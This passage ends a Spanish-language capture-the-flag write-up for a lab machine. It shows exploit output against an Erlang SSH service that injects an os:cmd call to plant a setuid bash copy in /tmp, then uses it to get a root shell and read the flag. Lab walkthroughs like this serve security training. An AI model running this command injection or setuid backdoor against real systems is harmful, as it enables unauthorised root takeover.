[*] Connecting to target...
[+] Received banner: SSH-2.0-Erlang/5.2.9
^KN:c,ǃ
       curve25519-sha256,curve25519-sha256@libssh.org,curve448-sha512,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com9ssh-ed25519,ecdsa-sha2-nistp256,rsa-sha2-512,rsa-sha2-256aes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbcaes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,chacha20-poly1305@openssh.com,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1{hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,hmac-sha1-etm@openssh.com,hmac-sha1none,zlib@openssh.com,zlibnone,zlib@openssh.com,zlib
[+] Running command: os:cmd("bash -c 'cp /bin/bash /tmp/fakebash && chmod 4755 /tmp/fakebash'").
[✓] Exploit sent. If vulnerable, command should execute.
```

Si ahora verificamos el binario `fakebash` que acabamos de crear e intentamos lanzarlo con la opción `-p`, obtendremos una shell con el `euid` del usuario `root`

``` bash
ben@soulmate:~$ ls /tmp/fakebash 
/tmp/fakebash
ben@soulmate:~$ /tmp/fakebash -p
fakebash-5.1# id
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben)
fakebash-5.1# cat root/root.txt 
a19...
```

Gracias por leer este artículo, lo aprecio mucho, te dejo la cita del día.

> A really great talent finds its happiness in execution.
> — Johann Wolfgang von Goethe
{: .notice--info}

